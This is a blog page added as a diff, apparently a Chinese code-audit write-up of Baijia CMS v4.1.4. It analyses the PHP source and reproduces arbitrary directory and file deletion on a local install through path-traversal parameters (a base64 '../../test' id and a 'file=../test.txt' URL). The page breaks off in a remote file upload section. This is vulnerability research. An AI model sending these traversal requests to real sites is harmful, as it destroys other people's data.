@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+    <meta charset="UTF-8">
+    
+    <link rel="apple-touch-icon" sizes="76x76" href="/null">
+    <link rel="icon" type="image/png" href="/null">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>百家CMS v4.1.4代码审计 - blckder02&#39;s blog</title>
+    
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+    
+    <meta name="description" content="">
+    <meta name="author" content="John Doe">
+    <meta name="keywords" content="">
+    <style>
+
+
+    
+    :root{
+        --shadow-color: rgba(0,0,0,0.2);
+        --sec-shadow: rgba(0,0,0,0.03);
+        --shadow-hover-color: rgba(0,0,0,0.28);
+        --first-text-color: #475b6d;
+        --second-text-color: #37475b;
+        --third-text-color: #858585;
+        --default-text-color: #505050;
+        --default-link-color: #007bff;
+        --link-color: #000000;
+        --second-link-color: #4F9BFA;
+        --code-color:rgba(27,31,35,.05);
+        --post-bkg-color: #fff;
+        --page-bkg-color: #f2f5f8;
+        --nav-a-hover-color: #3498db;
+        --post-sec-text-color: #718096;
+        --sec-bkg: #f2f5f8;
+        --color-mode: 'light';
+        --bkg-h: rgba(255,255,255,0.6);
+        --bkg-m: #e1e4e8;
+        --home-title-color: #4169E1;
+        --shadow: 0 4px 10px rgba(0,2,4,0.06),0 0 1px rgba(0,2,4,0.11);
+        --hr-color: #ddd;
+        --bg-t: #f4f4f4;
+        --nav-bkg: rgba(255,255,255,0.6);
+    }
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-mode: 'dark';
+  }
+
+  :root:not([data-theme]) {
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+  }
+}
+
+[data-theme='dark'] {
+    --shadow-color: rgba(0,0,0,0.2);
+    --shadow-hover-color: rgba(0,0,0,0.28);
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+}
+
+</style>
+
+
+
+<style>
+#page-main,footer,.p-btn{
+    display: none;
+}
+html,body{
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    overflow-y: overlay;
+}
+body{
+    background-color: var(--page-bkg-color);
+    color: var(--second-text-color);
+    overflow-y: scroll;
+}
+a {
+    color: var(--default-link-color);
+    text-decoration: none;
+    background-color: transparent;
+}
+a:hover{
+    color: var(--second-link-color);
+}
+.main-content,.post-card-main{
+    margin: 30px;
+}
+
+
+
+@media (max-width: 410px){
+    .post-card-main{
+        max-width: 350px!important;
+    }
+}
+
+@media (max-width: 980px){
+    .post-card-main{
+        max-width: 520px!important;
+    }
+}
+
+
+@media (min-width: 780px){ 
+    h3{
+        font-size: 1.5rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 1280px){ 
+    h3{
+        font-size: 1.7rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 2096px){ 
+    h3{
+        font-size: 1.8rem;
+        line-height: 1.5em;
+    }
+}
+
+.text-center{
+    text-align: center!important;
+}
+.middle-center{
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    -webkit-box-pack: center;
+    -ms-flex-pack: center;
+    justify-content: center;
+    height: 100%;
+}
+header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: fixed;
+    height: 54px;
+    padding: 0 1.25rem;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 10;
+    border-bottom: 1px solid var(--bkg-m);
+    background-color: var(--nav-bkg);
+}
+header .header__left, header .header__right {
+    display: flex;
+    align-items: center;
+    font-family: rubik,sans-serif,Varela Round;
+}
+header .header__left .logo__text {
+    font-size: 18px;
+    font-weight: 450;
+    padding: 14.5px 10px;
+    border-radius: 5px;
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus {
+    height: 54px;
+    padding: 0 0 0 15px;
+}
+header .header__right .button {
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus .navbar-menu {
+    display: inline-block;
+    align-items: center;
+    height: 54px;
+    padding: 0 10px;
+    font-size: 16px;
+    line-height: 54px;
+}
+header .header__right .dropdown-icon {
+    display: none;
+    height: 54px;
+    padding: 15px 10px;
+    border: 0;
+    background-color: transparent;
+}
+header .header__right .dropdown-menus {
+    line-height: 2rem;
+    animation: slide-in .15s ease 1;
+    display: none;
+    position: absolute;
+    left: 12px;
+    right: 12px;
+    top: calc(54px + 10px);
+    border-radius: 6px;
+    padding: 24px;
+    background-color: var(--page-bkg-color);
+    border: 1px solid var(--bkg-m);
+    z-index: 9999;
+    justify-items: center;
+    justify-content: center;
+    flex-direction: column;
+}
+header .header__right #btn-search, header .header__right #btn-toggle-dark{
+    display: inline-block;
+    padding:  18px 10px;
+    height: 25px;
+}
+header .header__right #btn-dropdown{
+  display: inline-block;
+  padding:  13.5px 0;
+}
+header .header__right .dropdown-menus .dropdown-menu {
+    padding: 10px;
+    color: var(--second-text-color);
+}
+@media screen and (max-width: 764px){
+.navbar__menus {
+    display: none!important;
+}
+.dropdown-icon {
+    display: inline-block!important;
+}
+}
+.p-btn{
+    position: fixed;
+    bottom: 1.2rem;
+    right: 1.2rem;
+    contain: layout;
+}
+.toc-btn,.click-btn{
+    cursor: pointer;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    align-items: center;
+    margin-top: .5rem;
+    font-size: .75rem;
+    background-color: var(--sec-bkg);
+    display: block;
+    padding: 0.9rem;
+    box-shadow: 0 0.3rem 0.6rem rgba(48,55,66,.15);
+    border: none;
+    border-radius: 0.5rem;
+    line-height: 1;
+    color: var(--first-text-color);
+}
+.toc-link{
+    color: var(--second-text-color);
+}
+
+#css-loading h3{
+    font-weight: 500;
+    font-size: 1.4rem;
+    text-align: center;
+    position: fixed;
+    top: 200px;
+    left: 0;
+    right: 0;
+    opacity: 0;
+    animation: cssLoad;
+    animation-delay: 0.3s;
+    -webkit-animation: cssLoad;
+    -webkit-animation-delay: 0.3s;
+}
+@keyframes cssLoad {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 0.9;
+    }
+}
+
+
+.memorial {
+    -webkit-filter: grayscale(100%);
+    -moz-filter: grayscale(100%);
+    -ms-filter: grayscale(100%);
+    -o-filter: grayscale(100%);
+    filter: grayscale(100%);
+    filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray;
+}
+
+
+    .post-copyright:after {
+        position: absolute;
+        color: #fff;
+        background: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'%3E%3Cpath fill='gray' d='M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z'/%3E%3C/svg%3E");
+        content: ' ';
+        height: 10rem;
+        width: 10rem;
+        right: -2rem;
+        top: -2rem;
+        opacity: .1;
+    }
+
+</style>
+
+    
+
+    
+        <!--
+        <link rel="stylesheet" href="/css/page.css" media="print"
+            onload="this.media='all';this.onload=null">
+        <noscript>-->
+            <link rel="stylesheet" href="/css/page.css">
+        <!--</noscript>-->
+    
+    
+    <link rel="stylesheet" href="/css/main.css" media="print" onload="this.media='all';this.onload=null">
+    <noscript>
+        <link rel="stylesheet" href="/css/main.css">
+    </noscript>
+
+    
+    <script src="/js/main.js"></script>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+        <header>
+            
+<div class="header__left">
+	<a href="/" class="button"><span class="logo__text">blckder02</span></a>
+</div>
+<div class="header__right">
+	<div class="navbar__menus">
+		
+		<a href="/" class="button">
+			<div class="navbar-menu">首页</div>
+		</a>
+		
+		<a href="/archives/" class="button">
+			<div class="navbar-menu">归档</div>
+		</a>
+		
+		<a href="/categories/" class="button">
+			<div class="navbar-menu">分类</div>
+		</a>
+		
+		<a href="/about/" class="button">
+			<div class="navbar-menu">关于</div>
+		</a>
+		
+	</div>
+	
+	<a href="/search/" class="button">
+		<div id="btn-search">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32">
+				<path
+					d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z">
+				</path>
+			</svg>
+		</div>
+	</a>
+	
+	<a href="javaScript:void(0);" class="button" id="btn-toggle-dark">
+		<div>
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none"
+				stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+			</svg>
+		</div>
+	</a>
+	<a href="javaScript:void(0);" class="dropdown-icon button">
+		<div id="btn-dropdown">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32" stroke-linecap="round">
+				<path
+					d="M903.43 561.52H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 204.31H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 918.73H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24z"
+					fill="currentColor"></path>
+			</svg>
+		</div>
+	</a>
+	<div class="dropdown-menus" id="dropdown-menus">
+		
+		<a href="/" class="dropdown-menu button">首页</a>
+		<br>
+		
+		<a href="/archives/" class="dropdown-menu button">归档</a>
+		<br>
+		
+		<a href="/categories/" class="dropdown-menu button">分类</a>
+		<br>
+		
+		<a href="/about/" class="dropdown-menu button">关于</a>
+		<br>
+		
+	</div>
+</div>
+
+        </header>
+        <div id="top"></div>
+        <div id="page-main" class="main-content">
+        <div class="mg-top">
+            
+
+<article class="page">
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>百家CMS v4.1.4代码审计</h3>
+    
+      <span class="post-meta-label">
+        John Doe
+      </span>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2022-09-18 15:18" pubdate>
+          2022-09-18
+        </time>
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 1.3k 字
+      </span>
+    
+    
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
+    
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="toc-number">2.</span> <span class="toc-text">审计准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%B7%AF%E5%BE%84%E5%88%A0%E9%99%A4"><span class="toc-number">3.</span> <span class="toc-text">任意路径删除</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-number">4.</span> <span class="toc-text">任意文件删除</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-number">4.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.</span> <span class="toc-text">远程文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="toc-number">6.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">7.</span> <span class="toc-text">远程命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="toc-number">7.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">7.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li></ol>
+    
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>源码下载：<a target="_blank" rel="noopener" href="https://gitee.com/openbaijia/baijiacms.git">https://gitee.com/openbaijia/baijiacms.git</a><br>放入PHPstudy，建一个baijiacms的数据库，访问进行安装，设置管理员用户和密码为admin、admin；</p>
+<h2 id="审计准备"><a href="#审计准备" class="headerlink" title="审计准备"></a>审计准备</h2><p><strong>查看网站目录结构</strong><br><img src="/./images/1607947859861.png" alt="enter description here">[1]</p>
+<p><strong>Seay源代码审计系统扫描</strong><br><img src="/./images/1607948138034.png" alt="enter description here">[2]</p>
+<h2 id="任意路径删除"><a href="#任意路径删除" class="headerlink" title="任意路径删除"></a>任意路径删除</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>点进这个漏洞查看代码；<br><img src="/./images/1607949964006.png" alt="enter description here">[3]</p>
+<p><strong>&#x2F;includes&#x2F;baijiacms&#x2F;common.inc.php</strong><br>(520-547)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rmdirs</span>(<span class="params"><span class="variable">$path</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$isdir</span>=<span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	    <span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	            <span class="variable">$file_list</span>= <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line">	            <span class="keyword">foreach</span> (<span class="variable">$file_list</span> <span class="keyword">as</span> <span class="variable">$file</span>)</span><br><span class="line">	            &#123;</span><br><span class="line">	                <span class="keyword">if</span>( <span class="variable">$file</span>!=<span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span>!=<span class="string">&#x27;..&#x27;</span>)</span><br><span class="line">	                &#123;</span><br><span class="line">	               		<span class="keyword">if</span>(<span class="variable">$file</span>!=<span class="string">&#x27;qrcode&#x27;</span>)</span><br><span class="line">	               		&#123;</span><br><span class="line">	                    <span class="title function_ invoke__">rmdirs</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>,<span class="literal">true</span>);</span><br><span class="line">	                  &#125;</span><br><span class="line">	                &#125;</span><br><span class="line">	            &#125;</span><br><span class="line">	            </span><br><span class="line">	    	<span class="keyword">if</span>(<span class="variable">$path</span>!=WEB_ROOT.<span class="string">&#x27;/cache/&#x27;</span>)</span><br><span class="line">	    	&#123;</span><br><span class="line">	            @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$path</span>);   </span><br><span class="line">	               </span><br><span class="line">	      &#125;    </span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span>); </span><br><span class="line">	    &#125;</span><br><span class="line">	 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过<code>$path</code>是路径，就删除这个路径，是文件就删除这个文件；<br>全局搜索<code>rmdirs</code>，发现<code>/system/menager/class/web/database.php</code>调用了这个函数(246-255)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$operation</span>==<span class="string">&#x27;delete&#x27;</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> 		<span class="variable">$d</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GP</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"> 			<span class="variable">$path</span> = WEB_ROOT . <span class="string">&#x27;/config/data_backup/&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span> . <span class="variable">$d</span>)) &#123;</span><br><span class="line">			<span class="title function_ invoke__">rmdirs</span>(<span class="variable">$path</span> . <span class="variable">$d</span>);</span><br><span class="line">			<span class="title function_ invoke__">message</span>(<span class="string">&#x27;备份删除成功！&#x27;</span>, <span class="title function_ invoke__">create_url</span>(<span class="string">&#x27;site&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;act&#x27;</span> =&gt; <span class="string">&#x27;manager&#x27;</span>,<span class="string">&#x27;do&#x27;</span> =&gt; <span class="string">&#x27;database&#x27;</span>,<span class="string">&#x27;op&#x27;</span>=&gt;<span class="string">&#x27;restore&#x27;</span>)),<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>功能是删除备份文件，但是只判断是否为路径，并没有验证是什么路径，所以可以抓包修改为任意路径，从而删除任意路径下的文件；</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>再根目录下建一个test文件夹，进入后台备份与还原页面，点击删除，抓包；<br><img src="/./images/1607949936425.png" alt="enter description here">[4]<br>将id的内容修改为要删除的test文件夹的路径<code>../../test</code>的base64编码<code>Li4vLi4vdGVzdA==</code>，Go，删除成功；<br><img src="/./images/1607950306436.png" alt="enter description here">[5]</p>
+<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p><strong>&#x2F;system&#x2F;eshop&#x2F;core&#x2F;mobile&#x2F;util&#x2F;uploader.php</strong><br>(46-50)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$operation</span> == <span class="string">&#x27;remove&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GPC</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">file_delete</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_json</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>获取到<code>$file</code>参数，调用<code>file_delete</code>函数，跟踪到<code>/includes/baijiacms/common.inc.php</code>(695-734)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_delete</span>(<span class="params"><span class="variable">$file_relative_path</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file_relative_path</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$settings</span>=<span class="title function_ invoke__">globaSystemSetting</span>();</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$settings</span>[<span class="string">&#x27;system_isnetattach&#x27;</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$settings</span>[<span class="string">&#x27;system_isnetattach&#x27;</span>]==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">require_once</span>(WEB_ROOT.<span class="string">&#x27;/includes/lib/lib_ftp.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$ftp</span>=<span class="keyword">new</span> <span class="title function_ invoke__">baijiacms_ftp</span>();</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ftp</span>-&gt;<span class="title function_ invoke__">connect</span>()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$ftp</span>-&gt;<span class="title function_ invoke__">ftp_delete</span>(<span class="variable">$settings</span>[<span class="string">&#x27;system_ftp_ftproot&#x27;</span>]. <span class="variable">$file_relative_path</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$settings</span>[<span class="string">&#x27;system_isnetattach&#x27;</span>]==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">require_once</span>(WEB_ROOT.<span class="string">&#x27;/includes/lib/lib_oss.php&#x27;</span>);</span><br><span class="line">		<span class="variable">$oss</span>=<span class="keyword">new</span> <span class="title function_ invoke__">baijiacms_oss</span>();</span><br><span class="line">		<span class="variable">$oss</span>-&gt;<span class="title function_ invoke__">deletefile</span>(<span class="variable">$file_relative_path</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(SYSTEM_WEBROOT . <span class="string">&#x27;/attachment/&#x27;</span> . <span class="variable">$file_relative_path</span>)) &#123;</span><br><span class="line">		<span class="title function_ invoke__">unlink</span>(SYSTEM_WEBROOT . <span class="string">&#x27;/attachment/&#x27;</span> . <span class="variable">$file_relative_path</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$settings[&#39;system_isnetattach&#39;]</code>是附件设置页面中的远程附件选择，有本地、FTP、OSS，我选择的是本地；<br><img src="/./images/1608019415441.png" alt="enter description here">[6]<br>直接到达最后一个else，进行<code>if_file</code>判断，然后执行<code>unlink</code>删除文件；</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在根目录下建一个test.txt，构造url访问：<br><code>http://127.0.0.1/baijiacms/index.php?mod=mobile&amp;act=uploader&amp;op=post&amp;do=util&amp;m=eshop&amp;op=remove&amp;file=../test.txt</code><br>成功删除；<br><img src="/./images/1607955648562.png" alt="enter description here">[7]</p>
+<h2 id="远程文件上传"><a href="#远程文件上传" class="headerlink" title="远程文件上传"></a>远程文件上传</h2><h2 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h2><p><strong>&#x2F;system&#x2F;public&#x2F;class&#x2F;web&#x2F;file.php</strong><br>(18-26)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$do</span> == <span class="string">&#x27;fetch&#x27;</span>) &#123;</span><br><span class="line">	<span class="variable">$url</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_GPC</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">fetch_net_file_upload</span>(<span class="variable">$url</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_error</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">		<span class="variable">$result</span>[<span class="string">&#x27;message&#x27;</span>] = <span class="variable">$file</span>[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line">		<span class="keyword">die</span>(<span 